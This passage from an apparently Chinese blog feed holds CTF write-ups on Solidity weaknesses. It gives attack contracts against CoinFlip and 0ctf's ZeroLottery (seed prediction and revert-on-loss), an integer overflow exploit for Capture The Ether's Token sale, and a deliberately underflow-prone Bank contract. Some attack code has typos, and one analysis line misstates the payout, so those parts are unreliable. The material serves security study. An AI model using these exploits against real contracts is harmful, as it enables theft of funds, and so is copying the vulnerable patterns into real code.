builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token builtin">bool</span> _guess<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    lastHash <span class="token operator">=</span> blockValue<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue <span class="token operator">/</span> FACTOR<span class="token punctuation">;</span>    <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>side <span class="token operator">==</span> _guess<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      consecutiveWins<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Hack</span><span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span><span class="token builtin">address</span> instance<span class="token operator">=</span>add<span class="token punctuation">;</span>CoinFlip c<span class="token operator">=</span><span class="token function">CoinFlip</span><span class="token punctuation">(</span>instance<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue<span class="token punctuation">.</span><span class="token function">div</span><span class="token punctuation">(</span>FACTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用10次 attack() 即可。</p><h4 id="使用-blockhash-的伪随机数"><a class="markdownIt-Anchor" href="#使用-blockhash-的伪随机数"></a> 使用 Blockhash 的伪随机数</h4><h5 id="原理-4"><a class="markdownIt-Anchor" href="#原理-4"></a> 原理</h5><p>Blockhash 是一个特殊的区块变量，EVM 只能获取到当前区块之前的 256 个区块的 blockhash （<strong>不含当前区块</strong>），对于这 256 个之外的区块返回 0。使用 blockhash 可能存在几种问题。</p><ol><li>误用，如 <code>block.blockhash(block.number)</code> 恒为零。</li><li>使用过去区块的有效 blockhash ，可以编写攻击合约获取相同值。</li><li>将猜数字和开奖的交易分开在两个不同区块中，并且使用猜数字时还不知道的某个区块的 blockhash 作为熵源，则可以等待 256 个区块后再进行开奖，消除 blockhash 的不确定性。</li></ol><h4 id="回滚攻击"><a class="markdownIt-Anchor" href="#回滚攻击"></a> 回滚攻击</h4><h5 id="原理-5"><a class="markdownIt-Anchor" href="#原理-5"></a> 原理</h5><p>在某些情况下，获取随机数可能过于困难或繁琐，这时可以考虑使用回滚攻击。回滚攻击的思想很简单：完全碰运气，输了就 “耍赖”，通过抛出异常使整个交易回滚不作数；赢的时候则不作处理，让交易被正常确认。</p><h4 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h4><p>0ctf final 2018 : ZeroLottery</p><p>Your goal is make your ZeroLottery’s balance &gt; 500. After that, you can get the flag at <a href="http://192.168.201.18:5000/flag?wallet=">http://192.168.201.18:5000/flag?wallet=</a> page.</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.21</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">ZeroLottery</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">SeedComponents</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint</span> component1<span class="token punctuation">;</span>        <span class="token builtin">uint</span> component2<span class="token punctuation">;</span>        <span class="token builtin">uint</span> component3<span class="token punctuation">;</span>        <span class="token builtin">uint</span> component4<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token builtin">uint</span> <span class="token keyword">private</span> base <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">private</span> owner<span class="token punctuation">;</span>    <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balanceOf<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">ZeroLottery</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">seed</span><span class="token punctuation">(</span>SeedComponents components<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint</span> secretSeed <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>            components<span class="token punctuation">.</span>component1<span class="token punctuation">,</span>            components<span class="token punctuation">.</span>component2<span class="token punctuation">,</span>            components<span class="token punctuation">.</span>component3<span class="token punctuation">,</span>            components<span class="token punctuation">.</span>component4        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> secretSeed<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">bet</span><span class="token punctuation">(</span><span class="token builtin">uint</span> guess<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token operator">></span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> secretSeed <span class="token operator">=</span> <span class="token function">seed</span><span class="token punctuation">(</span><span class="token function">SeedComponents</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>coinbase<span class="token punctuation">)</span><span class="token punctuation">,</span> block<span class="token punctuation">.</span>difficulty<span class="token punctuation">,</span> block<span class="token punctuation">.</span>gaslimit<span class="token punctuation">,</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> n <span class="token operator">=</span> <span class="token builtin">uint</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">,</span> secretSeed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> base<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>guess <span class="token operator">!=</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token comment">// charge 0.5 ether for failure</span>            msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">-</span> <span class="token number">0.5</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// charge 1 ether for success</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">-</span> <span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">paolu</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析：</p><p>ZeroLottery()  定义owner；</p><p>init() 初始化余额为100；</p><p>seed() 定义生成随机数函数；</p><p>bet() 进行下注，猜对了扣除0.5，余额清零；猜对了扣除1 ether，余额加上100；</p><p>paolu() 用来销毁合约，只能合约的拥有者能调用；</p><p>本题的目标是余额为500代币。</p><h6 id="exp1"><a class="markdownIt-Anchor" href="#exp1"></a> EXP1</h6><p>伪随机数攻击</p><p>block.coinbase, block.difficulty, block.gaslimit, block.timestamp来产生seed，因此区块变量是可以在本地计算出来的。</p><p>由于进行转账操作需要在攻击合约设置fallback函数</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.21</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">private</span> base <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>    <span class="token builtin">address</span> targetAddr <span class="token operator">=</span> <span class="token number">0xadd</span><span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>        owner<span class="token operator">=</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>        targetAddr<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"init()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//传6eth</span>    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token keyword">external</span><span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint</span> secretSeed <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>coinbase<span class="token punctuation">)</span><span class="token punctuation">,</span> block<span class="token punctuation">.</span>difficulty<span class="token punctuation">,</span> block<span class="token punctuation">.</span>gaslimit<span class="token punctuation">,</span> block<span class="token punctuation">.</span>timestamp        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> n <span class="token operator">=</span> <span class="token builtin">uint</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> secretSeed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> base<span class="token punctuation">;</span>                targetAddr<span class="token punctuation">.</span>call<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token number">1.2</span> ether<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"bet(uint256)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">paolu</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        targetAddr<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"init()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果要求传的钱&gt;1 ether，而且猜完最多会退1ether，因此相当于一定会退钱回我们的攻击合约，攻击五次即可。</p><h6 id="exp2"><a class="markdownIt-Anchor" href="#exp2"></a> EXP2</h6><p>回滚攻击</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">guess</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    task<span class="token punctuation">.</span>bet<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token number">2</span> ether<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">!=</span> <span class="token number">1.5</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//既然想要猜对，那么fallback函数必须要收到1.5ETH，我们可以设定一个固定的数进行尝试。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样可以利用循环：</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.21</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> addr <span class="token operator">=</span> <span class="token number">0x21106c363469FA680115096c2Ae757B4586C2a75</span><span class="token punctuation">;</span>    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>        addr<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"init()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">==</span><span class="token number">0.2</span> ether <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token builtin">uint</span> conut<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>count<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span>count<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token builtin">uint</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>n<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>n<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                addr<span class="token punctuation">.</span>call<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token number">1.2</span> ether <span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"bet(uint256)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">kill</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>owner<span class="token operator">==</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>既然是失败是扣0.5，成功扣1eth，那么如果回退的钱数与失败的一样，那么就抛出异常。</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Integer Overflow and Underflow</title>
      <link href="/2023/10/21/Integer-Overflow-and-Underflow/"/>
      <url>/2023/10/21/Integer-Overflow-and-Underflow/</url>
      
        <content type="html"><![CDATA[<h4 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h4><p>EVM的整数有int和uint两种。</p><p>在 <code>Solidity</code> 语言中,变量支持的整数类型步长是以8递增的,从 <code>uint8</code> 到 <code>uint256</code>, <code>uint</code> 默认是 <code>uint256</code>,以 <code>uin8</code> 为例</p><p>我们知道 <code>uint8</code> 是8位,我们最多可以 <code>2**8-1</code>,也就是 255,若是256则会造成溢出,这是上溢</p><p>下溢也是一样的, <code>uint(0)-1</code> 就是255</p><h4 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h4><p>Capture The Ether 的 Token sale</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.21</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">TokenSaleChallenge</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balanceOf<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">constant</span> PRICE_PER_TOKEN <span class="token operator">=</span> <span class="token number">1</span> ether<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">TokenSaleChallenge</span><span class="token punctuation">(</span><span class="token builtin">address</span> _player<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">isComplete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">&lt;</span> <span class="token number">1</span> ether<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> numTokens<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">==</span> numTokens <span class="token operator">*</span> PRICE_PER_TOKEN<span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> numTokens<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">sell</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> numTokens<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> numTokens<span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> numTokens<span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>numTokens <span class="token operator">*</span> PRICE_PER_TOKEN<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析：<br>首先规定了合约中有1 ether，一个代币需要支付1 ether. 而isComplete()要求余额小于1 ether。</p><p>buy(uint256 numTokens)函数则是msg.value == numTokens * PRICE_PER_TOKEN。</p><p>再EVM里1ether=10* *8 wei。然而EVM虚拟机最大只有256位即    2**256-1.因此只要我们的numTokens是一个很大的值，就会溢出。即我们花费不足1etner就买到了大量的代币，将一些代币卖出即可完成题目要求。</p><p>因此，我们可以购买2**256//10* *18+1 个代币就可以完成题目要求。</p><p>整数下溢</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Bank</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balanceOf<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> amount <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>send<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析：</p><p>由于uint为无符号类型，因此</p><p>balanceOf[msg.sender] - amount &gt;= 0看似没有任何问题，但是由于都是无符号类型，因此结果永远大于等于0的。所以我们可以任意取款。应改为balanceOf[msg.sender] &gt;=amount</p><p>还有一种情况，与重入攻击有关：将1的物品卖出两次导致下溢为巨大的正数。</p><h4 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h4><h5 